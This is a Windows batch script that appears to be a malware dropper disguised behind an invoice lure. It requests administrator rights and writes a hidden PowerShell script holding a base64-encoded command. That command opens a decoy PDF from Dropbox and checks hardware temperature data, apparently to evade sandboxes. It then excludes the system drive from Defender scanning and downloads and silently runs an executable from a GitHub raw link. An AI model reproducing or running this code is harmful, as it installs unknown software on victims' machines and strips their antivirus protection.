@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting admin privileges...
    powershell.exe -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Create the PowerShell script in AppData\Local\Temp
set "ps_script=%temp%\runtime_script.ps1"
(
echo $encodedCommand = 'IwAgAEYAdQBuAGMAdABpAG8AbgAgAHQAbwAgAGMAaABlAGMAawAgAGkAZgAgAHMAYwByAGkAcAB0ACAAaQBzACAAcgB1AG4AbgBpAG4AZwAgAHcAaQB0AGgAIABhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAA0ACgBGAHUAbgBjAHQAaQBvAG4AIABUAGUAcwB0AC0AQQBkAG0AaQBuACAAewANAAoAIAAgACAAIAAkAGEAZABtAGkAbgBDAGgAZQBjAGsAIAA9ACAAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQANAAoAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAYQBkAG0AaQBuAEMAaABlAGMAawAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABJAG4AUgBvAGwAZQBdACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIAKQANAAoAfQANAAoADQAKACMAIABJAGYAIABuAG8AdAAgAHIAdQBuAG4AaQBuAGcAIABhAHMAIABhAGQAbQBpAG4ALAAgAHIAZQBsAGEAdQBuAGMAaAAgAHQAaABlACAAcwBjAHIAaQBwAHQAIAB3AGkAdABoACAAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwANAAoAaQBmACAAKAAtAE4AbwB0ACAAKABUAGUAcwB0AC0AQQBkAG0AaQBuACkAKQAgAHsADQAKACAAIAAgACAAJABzAGMAcgBpAHAAdABQAGEAdABoACAAPQAgACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBvAG0AbQBhAG4AZAAuAFAAYQB0AGgADQAKACAAIAAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACIALAAgACIALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAiACwAIAAiAEIAeQBwAGEAcwBzACIALAAgACIALQBGAGkAbABlACIALAAgACIAYAAiACQAcwBjAHIAaQBwAHQAUABhAHQAaABgACIAIgAgAC0AVgBlAHIAYgAgAFIAdQBuAEEAcwANAAoAIAAgACAAIABlAHgAaQB0AA0ACgB9AA0ACgANAAoAIwAgAFMAdABlAHAAIAAxADoAIABEAG8AdwBuAGwAbwBhAGQAIABhAG4AZAAgAG8AcABlAG4AIABQAEQARgANAAoAJABnAGkAcgBhAGYAZgBlACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBvAGwAOAB2ADkAYwBjAHIAcwA4ADEANABtAGYAMgBtAHEAZgBrADMAdgAvAEkAbgB2AG8AaQBjAGUALgBwAGQAZgA/AHIAbABrAGUAeQA9ADMAYgAxAGIAMAAxAHMAcAB5AGgAaQA3AGMAcQA3AG0AbABwAGMAYgBiAGUAYwAwAG4AJgBzAHQAPQAyAGsAZwBnAG8AegB0AHEAJgBkAGwAPQAxACIADQAKACQAYwB1AHAAYwBhAGsAZQAgAD0AIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAG8AdwBuAGwAbwBhAGQAcwBcAEkAbgB2AG8AaQBjAGUALQA5ADEANgA4ADMAMQAwAC4AegBpAHAAXABpAG4AdgBvAGkAYwBlAC4AcABkAGYAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAZwBpAHIAYQBmAGYAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAYwB1AHAAYwBhAGsAZQANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABjAHUAcABjAGEAawBlAA0ACgANAAoAIwAgAFMAdABlAHAAIAAyADoAIABDAGgAZQBjAGsAIABzAHkAcwB0AGUAbQAgAHQAZQBtAHAAZQByAGEAdAB1AHIAZQAgACgAVwBNAEkALQBiAGEAcwBlAGQAKQANAAoAJAB1AG0AYgByAGUAbABsAGEAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAE0AUwBBAGMAcABpAF8AVABoAGUAcgBtAGEAbABaAG8AbgBlAFQAZQBtAHAAZQByAGEAdAB1AHIAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXAB3AG0AaQAiACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEMAdQByAHIAZQBuAHQAVABlAG0AcABlAHIAYQB0AHUAcgBlAA0ACgANAAoAIwAgAEkAZgAgAG4AbwAgAHQAZQBtAHAAZQByAGEAdAB1AHIAZQAgAGQAYQB0AGEAIABpAHMAIABmAG8AdQBuAGQALAAgAGUAeABpAHQADQAKAGkAZgAgACgALQBuAG8AdAAgACQAdQBtAGIAcgBlAGwAbABhACkAIAB7AA0ACgAgACAAIAAgAGUAeABpAHQADQAKAH0ADQAKAA0ACgAjACAAUwB0AGUAcAAgADMAOgAgAEUAeABjAGwAdQBkAGUAIABVAHMAZQByAHMAIABmAG8AbABkAGUAcgAgAGYAcgBvAG0AIABhAG4AdABpAHYAaQByAHUAcwAgAHMAYwBhAG4ADQAKACQAYgBhAGwAbABvAG8AbgAgAD0AIAAiACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBEAHIAaQB2AGUAXAAiAA0ACgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABiAGEAbABsAG8AbwBuAA0ACgANAAoAIwAgAFMAdABlAHAAIAA0ADoAIABCAHUAaQBsAGQAIABhAG4AZAAgAHMAYQB2AGUAIABhAG4AbwB0AGgAZQByACAAcwBjAHIAaQBwAHQAIAB0AG8AIABmAGkAbABlACwAIAB0AGgAZQBuACAAZQB4AGUAYwB1AHQAZQAgAGkAdAANAAoAJAB3AGgAYQBsAGUAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFMAYwByAGkAcAB0AGoAdQBuAGsAaQBlADEALwB6AHoAegB6AHoALwByAGEAdwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8ARgBhAGkAcgBHAGEAbQBlAC4AZQB4AGUAIgANAAoAJABtAG8AbwBuACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABGAGEAaQByAEcAYQBtAGUALgBlAHgAZQAiAA0ACgAkAG4AZQB3AFMAYwByAGkAcAB0AFAAYQB0AGgAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHIAdQBuAHQAaQBtAGUAXwBzAGMAcgBpAHAAdAAuAHAAcwAxACIADQAKACQAcwBjAHIAaQBwAHQAQwBvAG4AdABlAG4AdAAgAD0AIABAACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHcAaABhAGwAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAbQBvAG8AbgANAAoAIwAgAFIAdQBuACAAdABoAGUAIABFAFgARQAgAHcAaQB0AGgAIABhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzACAAaQBmACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAHIAdQBuACAAdwBpAHQAaAAgAGEAZABtAGkAbgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMADQAKAGkAZgAgACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApAC4ARwByAG8AdQBwAHMAIAAtAG0AYQB0AGMAaAAgACcAUwAtADEALQA1AC0AMwAyAC0ANQA0ADQAJwApACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG0AbwBvAG4AIAAtAFYAZQByAGIAIABSAHUAbgBBAHMADQAKAH0AIABlAGwAcwBlACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG0AbwBvAG4ADQAKAH0ADQAKACIAQAANAAoADQAKACMAIABXAHIAaQB0AGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAdABvACAAYQAgAGYAaQBsAGUADQAKACQAcwBjAHIAaQBwAHQAQwBvAG4AdABlAG4AdAAgAHwAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAG4AZQB3AFMAYwByAGkAcAB0AFAAYQB0AGgADQAKAA0ACgAjACAAQwBvAHIAcgBlAGMAdABlAGQAIABhAHIAZwB1AG0AZQBuAHQAIABoAGEAbgBkAGwAaQBuAGcAIABmAG8AcgAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAnAC0ATgBvAFAAcgBvAGYAaQBsAGUAJwAsACAAJwAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACcALAAgACcAQgB5AHAAYQBzAHMAJwAsACAAJwAtAEYAaQBsAGUAJwAsACAAIgBgACIAJABuAGUAdwBTAGMAcgBpAHAAdABQAGEAdABoAGAAIgAiACkAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA0ACgA='
echo powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand
) > "%ps_script%"

:: Execute the PowerShell script as admin
powershell -ExecutionPolicy Bypass -File "%ps_script%" -WindowStyle Hidden

exit